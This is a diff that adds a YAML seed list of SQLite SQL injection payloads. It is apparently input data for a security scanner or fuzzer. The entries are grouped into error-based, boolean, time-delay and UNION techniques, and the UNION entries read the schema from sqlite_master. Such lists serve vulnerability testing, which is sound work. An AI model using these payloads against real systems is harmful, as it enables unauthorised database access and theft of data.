@@ -1,0 +1,37 @@
+# SQLite-specific SQLi payloads
+seeds:
+  sqli:
+    error:
+      - raw: "' AND 1=1 AND load_extension()-- "
+        dbms: "SQLite"
+        ctx: ["string"]
+    boolean_true:
+      - raw: "' AND 1=1 AND typeof(1)='integer'-- "
+        dbms: "SQLite"
+        ctx: ["string"]
+      - raw: "1 AND typeof(1)='integer'-- "
+        dbms: "SQLite"
+        ctx: ["numeric"]
+    boolean_false:
+      - raw: "' AND 1=2 AND typeof(1)='integer'-- "
+        dbms: "SQLite"
+        ctx: ["string"]
+      - raw: "1 AND typeof(1)='text'-- "
+        dbms: "SQLite"
+        ctx: ["numeric"]
+    error:
+      - raw: "' AND 1=1 AND load_extension('')-- "
+        dbms: "SQLite"
+        ctx: ["string"]
+    time_sqlite:
+      - raw: "' AND 1=1 AND randomblob(1000000000)-- "
+        dbms: "SQLite"
+      - raw: "' AND 1=1 AND (SELECT count(*) FROM pragma_table_info('x'))-- "
+        dbms: "SQLite"
+    union:
+      - raw: "' UNION SELECT sqlite_version(),2-- "
+        dbms: "SQLite"
+        ctx: ["string"]
+      - raw: "' UNION SELECT name,2 FROM sqlite_master-- "
+        dbms: "SQLite"
+        ctx: ["string"]
